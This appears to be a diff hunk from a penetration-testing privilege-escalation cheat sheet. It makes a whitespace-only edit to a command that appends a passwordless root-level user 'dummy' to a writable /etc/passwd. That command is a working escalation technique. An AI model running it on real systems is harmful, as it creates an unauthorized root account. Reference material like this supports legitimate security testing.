@@ -57,7 +57,7 @@ wmic os get osarchitecture
 ### Writable /etc/passwd
 
 ```text
-echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
+echo 'dummy::0:0::/root:/bin/bash' >> /etc/passwd
 ```
 
 ### Linux Kernel 2.6 UDEV
